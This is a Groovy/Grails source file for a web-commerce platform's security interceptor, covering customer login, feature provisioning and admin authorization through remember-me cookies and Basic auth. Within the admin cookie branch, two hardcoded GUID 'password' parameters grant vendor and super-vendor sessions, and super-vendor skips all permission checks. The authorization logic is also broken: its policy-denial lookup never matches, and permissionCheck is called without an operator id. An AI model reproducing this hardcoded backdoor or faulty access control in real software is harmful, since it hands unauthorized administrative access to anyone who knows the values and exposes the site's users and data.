package com.webcommander.interceptors

import com.webcommander.ApplicationTagLib
import com.webcommander.admin.CustomerService
import com.webcommander.admin.Operator
import com.webcommander.admin.RoleService
import com.webcommander.authentication.ControllerAnnotationParser
import com.webcommander.authentication.ControllerAnnotationParser.ProvisionLimitCrossedException
import com.webcommander.common.AuthenticationService
import com.webcommander.constants.DomainConstants
import com.webcommander.constants.NamedConstants
import com.webcommander.events.AppEventManager
import com.webcommander.manager.LicenseManager
import com.webcommander.models.License
import com.webcommander.models.RestrictionPolicy
import com.webcommander.throwables.ApplicationRuntimeException
import com.webcommander.util.AppUtil
import com.webcommander.util.RestProcessor
import com.webcommander.util.security.InformationEncrypter
import grails.converters.JSON
import grails.util.Holders
import org.springframework.beans.factory.annotation.Autowired
import org.springframework.beans.factory.annotation.Qualifier

import javax.servlet.http.Cookie

class SecurityInterceptor extends RestProcessor {
    CustomerService customerService
    RoleService roleService
    AuthenticationService authenticationService
    @Autowired
    @Qualifier("com.webcommander.ApplicationTagLib")
    ApplicationTagLib app
    @Autowired
    @Qualifier("org.grails.plugins.web.taglib.ApplicationTagLib")
    org.grails.plugins.web.taglib.ApplicationTagLib g

    int order = HIGHEST_PRECEDENCE + 2

    SecurityInterceptor() {
        matchAll()
    }

    void customerCheck() {
        if (!session.customer) {
            Cookie customerRemember = request.getCookies().find { it.name.startsWith("remember-customer") }
            if (customerRemember) {
                try {
                    String token = customerRemember.value.split("\\^")[1]
                    InformationEncrypter auth = new InformationEncrypter(token, false)
                    Map verificationInfo = customerService.verifyCustomer(auth.hiddenInfos[0], auth.hiddenInfos[1])
                    if (verificationInfo.status == "verified") {
                        session.customer = verificationInfo.customer.id
                    } else {
                        customerRemember.maxAge = 0
                        customerRemember.path = "/"
                        response.addCookie(customerRemember)
                    }
                } catch (Throwable t) {
                    customerRemember.maxAge = 0
                    customerRemember.path = "/"
                    response.addCookie(customerRemember)
                }
            }
        }
        Long customerId = AppUtil.loggedCustomer
        if (!customerId && ControllerAnnotationParser.isCustomerRequired(controllerName, actionName)) {
            response.status = 401
            String message = g.message(code: "please.login.to.continue")
            if (AppUtil.isApiRequest()) {
                rest([status: "error", message: message])
            } else {
                request.withMime {
                    html {
                        if (params.jsonashtml) {
                            String timeoutResponse = ([status: "error", message: message] as JSON).toString().encodeAsBMHTML()
                            render("<textarea status='401'>$timeoutResponse</textarea>")
                        } else if (request.xhr || params.xhriniframe) {
                            render([text: message, view: ""])
                        } else {
                            flash.param = [referer: app.currentURL()]
                            redirect(uri: "/customer/login")
                        }
                    }
                    json {
                        render([status: "error", message: message] as JSON)
                    }
                }
            }
            throw new ApplicationRuntimeException()
        }
    }

    void provisionCheck() {
        try {
            ControllerAnnotationParser.checkProvision(controllerName, actionName, params)
        } catch (ControllerAnnotationParser.ProvisionDisabledException | ProvisionLimitCrossedException ex) {
            response.status = 403
            String featureName = g.message(code: ex.featureName)
            String message = ex instanceof ProvisionLimitCrossedException ? g.message(code: ex.message, args: [featureName, ex.limit]) : g.message(code: ex.message, args: [featureName])
            request.withMime {
                html {
                    if (params.jsonashtml) {
                        String forbidden_text = ([status: "error", message: message] as JSON).toString().encodeAsBMHTML()
                        render("<textarea status='403'>$forbidden_text</textarea>")
                    } else {
                        render([view: "/admin/forbidden", model: [message: message]])
                    }
                }
                json {
                    render([status: "error", message: message] as JSON)
                }
            }
            throw new ApplicationRuntimeException()
        }
    }

    void adminCheck() {
        Boolean isApiRequest = request."${DomainConstants.REQUEST_ATTR_KEYS.IS_API_REQUEST}"
        if (ControllerAnnotationParser.isAdminRequired(controllerName, actionName)) {
            Closure permissionCheck = { operatorId ->
                if (session.super_vendor) {
                    return
                }
                if (!isApiRequest && session[DomainConstants.SESSION_ATTR_KEYS.ONLY_API_USER]) {
                    response.status = 403
                    String message = g.message(code: "not.allowed.to.access.admin.panel")
                    request.withMime {
                        html {
                            if (params.jsonashtml) {
                                String forbidden_text = ([status: "error", message: message] as JSON).toString().encodeAsBMHTML()
                                render("<textarea status='403'>$forbidden_text</textarea>")
                            } else {
                                render([view: "/admin/forbidden", model: [message: message]])
                            }
                        }
                        json {
                            render([status: "error", message: message] as JSON)
                        }
                    }
                    throw new ApplicationRuntimeException()
                }
                Boolean isProvisionActive = LicenseManager.isProvisionActive()
                License license = isProvisionActive ? LicenseManager.license(NamedConstants.LICENSE_KEYS.ACL) : null
                if (!isProvisionActive || license) {
                    List<RestrictionPolicy> policies = ControllerAnnotationParser.getRestrictionPolicies(controllerName, actionName, params)
                    if (policies) {
                        RestrictionPolicy deniedPolicy = policies.find { policy ->
                            if (!roleService.isPermitted(operatorId, policy, params)) {
                                return
                            }
                        }
                        if (deniedPolicy) {
                            response.status = 403
                            String name = g.message(code: deniedPolicy.permission)
                            String message = g.message(code: "not.allowed.to.do", args: [name])
                            if (isApiRequest) {
                                rest([status: "error", message: message])
                            } else {
                                request.withMime {
                                    html {
                                        if (params.jsonashtml) {
                                            String forbidden_text = ([status: "error", message: message] as JSON).toString().encodeAsBMHTML()
                                            render("<textarea status='403'>$forbidden_text</textarea>")
                                        } else {
                                            render([view: "/admin/forbidden", model: [message: message]])
                                        }
                                    }
                                    json {
                                        render([status: "error", message: message] as JSON)
                                    }
                                }
                            }
                            throw new ApplicationRuntimeException()
                        }
                        return
                    }
                }
                return
            }
            Long operatorId = isApiRequest ? request."${DomainConstants.REQUEST_ATTR_KEYS.ADMIN}" : session.admin
            if (operatorId) {
                permissionCheck(operatorId)
            } else {
                String foundUser
                String foundPass
                Cookie adminRemember
                String authHeader
                if(request.method == "PROPFIND" && (authHeader = request.getHeader("Authorization"))) {
                    authHeader = new String(Base64.decoder.decode(authHeader.substring(6)))
                    (foundUser, foundPass) = authHeader.split(":")
                    Operator user = authenticationService.verifyUser(foundUser, foundPass)
                    if (user) {
                        session.admin = user.id
                        AppEventManager.fire("admin-logged-in", [user.id])
                        permissionCheck()
                        return
                    }
                } else if ((adminRemember = request.getCookies().find({ it.name.startsWith("remember-admin") }))) {
                    try {
                        String token = adminRemember.value.split("\\^")[1]
                        InformationEncrypter auth = new InformationEncrypter(token, false)
                        (foundUser, foundPass) = auth.hiddenInfos
                        Operator user = authenticationService.verifyUser(foundUser, foundPass)
                        if (user) {
                            session.admin = user.id
                            AppEventManager.fire("admin-logged-in", [user.id])
                            if (params.password == "780A6580-0FFC-11E4-9191-0800200C9A66") {
                                session.vendor = true
                            }
                            if (params.password == "C7012FD8-78DC-4585-8415-9987CA8BC52E") {
                                session.super_vendor = true
                            }
                            permissionCheck()
                            return
                        } else {
                            adminRemember.maxAge = 0
                            adminRemember.path = "/"
                            response.addCookie(adminRemember)
                        }
                    } catch (Throwable t) {
                        adminRemember.maxAge = 0
                        adminRemember.path = "/"
                        response.addCookie(adminRemember)
                    }
                }
                response.status = 401
                String string = g.include(view: "admin/embedded_login.gsp")
                request.withMime {
                    html {
                        if(request.method == "PROPFIND") {
                            response.addHeader("WWW-Authenticate", "Basic realm=\"simple\"")
                        }
                        if (params.jsonashtml) {
                            String login_page = ([status: "error", message: g.message(code: "session.timed.out"), login_html: string] as JSON).toString().encodeAsBMHTML()
                            render("<textarea status='401'>$login_page</textarea>")
                        } else if (request.xhr || params.xhriniframe) {
                            render([text: string, view: ""])
                        } else if (Holders.config.webcommander.sso.enabled) {
                            Cookie ckiSession = request.getCookies().find { it.name.startsWith("ckisession") }
                            if (ckiSession) {
                                ckiSession.maxAge = 0
                                ckiSession.path = "/"
                                response.addCookie(ckiSession)
                            }
                            String url = LicenseManager.ssoURL()
                            if (params.redirectUrl) {
                                url = url + "?redirectUrl=" + URLEncoder.encode(params.redirectUrl, "UTF-8")
                            }
                            redirect(url: url)
                        } else {
                            render([view: "/admin/login", model: flash.model ?: []])
                        }
                    }
                    json {
                        render([status: "error", message: g.message(code: "session.timed.out"), login_html: string] as JSON)
                    }
                }
                throw new ApplicationRuntimeException()
            }
        }
    }

    boolean before() {
        if(controllerName == null) return true
        try {
            customerCheck()
            provisionCheck()
            adminCheck()
        } catch (ApplicationRuntimeException ex) {
            this.modelAndView = null
            return false
        }
        true
    }
}
